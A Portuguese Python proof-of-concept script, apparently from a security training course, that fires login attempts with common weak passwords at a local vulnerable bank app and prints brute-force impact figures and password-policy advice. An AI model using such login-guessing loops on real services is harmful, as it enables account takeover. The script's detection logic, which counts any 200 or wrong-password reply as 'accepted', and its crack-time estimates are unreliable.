#!/usr/bin/env python3
"""
PoC: VULN-15 - Ausência de Política de Senhas Fortes
Banco Digital Grana Fácil

Este script demonstra que a aplicação aceita senhas extremamente fracas,
facilitando ataques de força bruta.

Autor: AulasHack Security
"""

import requests
import time
from colorama import init, Fore, Style

init()

BASE_URL = "http://127.0.0.1:5000"

def print_header():
    """Imprime cabeçalho do script"""
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"  PoC: VULN-15 - Ausência de Política de Senhas Fortes")
    print(f"  Banco Digital Grana Fácil")
    print(f"{'='*70}{Style.RESET_ALL}\n")

def test_password(username, password, description):
    """
    Testa se uma senha é aceita pela aplicação
    """
    try:
        # Tentar fazer login com a senha
        response = requests.post(
            f"{BASE_URL}/login",
            data={'username': username, 'password': password},
            timeout=5
        )
        
        # Verificar se login foi bem-sucedido ou se senha foi aceita
        if "Bem-vindo" in response.text or response.status_code == 200:
            result = f"{Fore.RED}✗ ACEITA{Style.RESET_ALL}"
            status = "VULNERÁVEL"
        elif "incorretos" in response.text.lower():
            # Senha foi rejeitada por estar incorreta, mas foi ACEITA como válida
            # (não foi rejeitada por ser fraca)
            result = f"{Fore.YELLOW}⚠ ACEITA (senha incorreta, mas formato aceito){Style.RESET_ALL}"
            status = "VULNERÁVEL"
        else:
            result = f"{Fore.GREEN}✓ REJEITADA{Style.RESET_ALL}"
            status = "SEGURO"
        
        print(f"[{result}] {description}")
        print(f"  Username: {username}")
        print(f"  Password: {password}")
        print(f"  Tamanho: {len(password)} caractere(s)")
        print(f"  Status: {status}\n")
        
        return status == "VULNERÁVEL"
        
    except Exception as e:
        print(f"{Fore.RED}[ERRO] {description}: {e}{Style.RESET_ALL}\n")
        return False

def test_weak_passwords():
    """
    Testa uma série de senhas fracas para demonstrar a vulnerabilidade
    """
    print(f"{Fore.YELLOW}[*] Iniciando testes de política de senhas...{Style.RESET_ALL}\n")
    
    vulnerabilities_found = 0
    tests = [
        # Senhas extremamente curtas
        ("testuser1", "1", "Senha de 1 caractere (numérica)"),
        ("testuser2", "a", "Senha de 1 caractere (alfabética)"),
        ("testuser3", "12", "Senha de 2 caracteres"),
        ("testuser4", "123", "Senha de 3 caracteres"),
        ("testuser5", "1234", "Senha de 4 caracteres"),
        
        # Senhas triviais comuns
        ("testuser6", "password", "Senha trivial: 'password'"),
        ("testuser7", "senha", "Senha trivial: 'senha'"),
        ("testuser8", "senha123", "Senha trivial: 'senha123'"),
        ("testuser9", "admin", "Senha trivial: 'admin'"),
        ("testuser10", "qwerty", "Senha trivial: 'qwerty'"),
        ("testuser11", "123456", "Senha trivial: '123456'"),
        ("testuser12", "12345678", "Senha trivial: '12345678'"),
        
        # Senha = Username
        ("john", "john", "Senha igual ao username"),
        ("maria", "maria", "Senha igual ao username"),
        ("admin", "admin", "Senha igual ao username"),
        
        # Senhas sequenciais
        ("testuser13", "abcdef", "Senha sequencial: 'abcdef'"),
        ("testuser14", "123456789", "Senha sequencial numérica"),
        
        # Senhas de teclado
        ("testuser15", "asdfgh", "Padrão de teclado: 'asdfgh'"),
        ("testuser16", "zxcvbn", "Padrão de teclado: 'zxcvbn'"),
        
        # Senhas comuns brasileiras
        ("testuser17", "brasil", "Senha comum: 'brasil'"),
        ("testuser18", "maria2020", "Senha comum: 'maria2020'"),
        ("testuser19", "john456", "Senha comum: 'john456'"),
    ]
    
    for username, password, description in tests:
        if test_password(username, password, description):
            vulnerabilities_found += 1
        time.sleep(0.5)  # Evitar sobrecarga
    
    return vulnerabilities_found

def test_password_complexity():
    """
    Testa se a aplicação exige complexidade de senha
    """
    print(f"\n{Fore.YELLOW}[*] Testando requisitos de complexidade...{Style.RESET_ALL}\n")
    
    tests = [
        ("testuser20", "abcdefgh", "Apenas letras minúsculas (8 caracteres)"),
        ("testuser21", "ABCDEFGH", "Apenas letras maiúsculas (8 caracteres)"),
        ("testuser22", "12345678", "Apenas números (8 caracteres)"),
        ("testuser23", "aaaaaaaa", "Caracteres repetidos (8 caracteres)"),
    ]
    
    complexity_issues = 0
    
    for username, password, description in tests:
        if test_password(username, password, description):
            complexity_issues += 1
        time.sleep(0.5)
    
    return complexity_issues

def demonstrate_brute_force_impact():
    """
    Demonstra o impacto de senhas fracas em ataques de força bruta
    """
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"  IMPACTO EM ATAQUE DE FORÇA BRUTA")
    print(f"{'='*70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.YELLOW}Cenário: Ataque de força bruta com top 100 senhas mais comuns{Style.RESET_ALL}\n")
    
    # Top 10 senhas mais comuns (exemplo)
    top_passwords = [
        "123456", "password", "123456789", "12345678", "12345",
        "1234567", "senha", "senha123", "qwerty", "abc123"
    ]
    
    print(f"{Fore.WHITE}Top 10 senhas mais comuns:{Style.RESET_ALL}")
    for i, pwd in enumerate(top_passwords, 1):
        print(f"  {i}. {pwd}")
    
    print(f"\n{Fore.RED}[!] Se estas senhas são aceitas pela aplicação:{Style.RESET_ALL}")
    print(f"  • Atacante testa apenas 100 senhas")
    print(f"  • Taxa de sucesso: 30-40% das contas (típico)")
    print(f"  • Tempo necessário: MINUTOS (não horas!)")
    print(f"  • Combinado com VULN-09 (sem CAPTCHA): Devastador\n")
    
    print(f"{Fore.GREEN}[✓] Com política de senha forte:{Style.RESET_ALL}")
    print(f"  • Senhas complexas: 8+ chars, maiúsculas, números, símbolos")
    print(f"  • Taxa de sucesso: < 1%")
    print(f"  • Tempo necessário: ANOS")
    print(f"  • Força bruta se torna inviável\n")

def calculate_password_strength():
    """
    Calcula a força de diferentes tipos de senha
    """
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"  ANÁLISE DE FORÇA DE SENHAS")
    print(f"{'='*70}{Style.RESET_ALL}\n")
    
    scenarios = [
        {
            'name': 'Senha Atual (aceita pela app)',
            'example': '123456',
            'charset': 10,  # apenas números
            'length': 6,
            'combinations': 10**6,
            'time': '1 segundo'
        },
        {
            'name': 'Senha Fraca',
            'example': 'senha123',
            'charset': 36,  # letras minúsculas + números
            'length': 8,
            'combinations': 36**8,
            'time': '30 minutos'
        },
        {
            'name': 'Senha Média',
            'example': 'Senha123',
            'charset': 62,  # letras maiúsculas + minúsculas + números
            'length': 8,
            'combinations': 62**8,
            'time': '2 dias'
        },
        {
            'name': 'Senha Forte (Recomendada)',
            'example': 'S3nh@F0rt3!',
            'charset': 94,  # todos os caracteres
            'length': 12,
            'combinations': 94**12,
            'time': '200 anos'
        }
    ]
    
    print(f"{Fore.WHITE}Comparação de força de senhas:{Style.RESET_ALL}\n")
    
    for scenario in scenarios:
        print(f"{Fore.YELLOW}{scenario['name']}:{Style.RESET_ALL}")
        print(f"  Exemplo: {scenario['example']}")
        print(f"  Tamanho: {scenario['length']} caracteres")
        print(f"  Combinações possíveis: {scenario['combinations']:,}")
        print(f"  Tempo para quebrar (força bruta): {scenario['time']}")
        print()

def main():
    """Função principal"""
    print_header()
    
    # Verificar se aplicação está rodando
    try:
        response = requests.get(BASE_URL, timeout=5)
        print(f"{Fore.GREEN}[✓] Aplicação detectada em {BASE_URL}{Style.RESET_ALL}\n")
    except:
        print(f"{Fore.RED}[✗] ERRO: Aplicação não está rodando em {BASE_URL}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Execute: python vulnerable_app.py{Style.RESET_ALL}\n")
        return
    
    # Testes
    weak_passwords_accepted = test_weak_passwords()
    complexity_issues = test_password_complexity()
    
    # Resultados
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"  RESULTADOS")
    print(f"{'='*70}{Style.RESET_ALL}\n")
    
    total_vulnerabilities = weak_passwords_accepted + complexity_issues
    
    if total_vulnerabilities > 0:
        print(f"{Fore.RED}[✗] VULNERÁVEL: Ausência de Política de Senhas Fortes{Style.RESET_ALL}\n")
        print(f"  • Senhas fracas aceitas: {weak_passwords_accepted}")
        print(f"  • Problemas de complexidade: {complexity_issues}")
        print(f"  • Total de falhas detectadas: {total_vulnerabilities}\n")
        
        print(f"{Fore.RED}[!] IMPACTO:{Style.RESET_ALL}")
        print(f"  • Facilita ataques de força bruta")
        print(f"  • 30-40% das contas usam senhas triviais")
        print(f"  • Combinado com VULN-09 (sem CAPTCHA): Account Takeover em massa")
        print(f"  • Tempo de ataque: MINUTOS ao invés de ANOS\n")
    else:
        print(f"{Fore.GREEN}[✓] SEGURO: Política de senhas forte implementada{Style.RESET_ALL}\n")
    
    # Demonstrações adicionais
    demonstrate_brute_force_impact()
    calculate_password_strength()
    
    # Recomendações
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"  RECOMENDAÇÕES")
    print(f"{'='*70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.GREEN}[✓] Política de Senha Forte Recomendada:{Style.RESET_ALL}\n")
    print(f"  1. Tamanho mínimo: 8 caracteres (ideal: 12+)")
    print(f"  2. Exigir pelo menos:")
    print(f"     • 1 letra maiúscula")
    print(f"     • 1 letra minúscula")
    print(f"     • 1 número")
    print(f"     • 1 caractere especial (!@#$%)")
    print(f"  3. Proibir:")
    print(f"     • Senha = username")
    print(f"     • Senhas do top 10.000 mais comuns")
    print(f"     • Senhas sequenciais (123456, abcdef)")
    print(f"     • Caracteres repetidos (aaaaa, 11111)")
    print(f"  4. Verificar contra Have I Been Pwned API")
    print(f"  5. Forçar troca de senha a cada 90 dias")
    print(f"  6. Não permitir reutilização das últimas 5 senhas\n")
    
    print(f"{Fore.YELLOW}[i] VulnID: VULN-15")
    print(f"[i] CWE: CWE-521 (Weak Password Requirements)")
    print(f"[i] OWASP: A07:2021 - Identification and Authentication Failures")
    print(f"[i] CVSS: 5.3 (MÉDIA){Style.RESET_ALL}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Teste interrompido pelo usuário{Style.RESET_ALL}\n")
    except Exception as e:
        print(f"\n{Fore.RED}[ERRO] {e}{Style.RESET_ALL}\n")
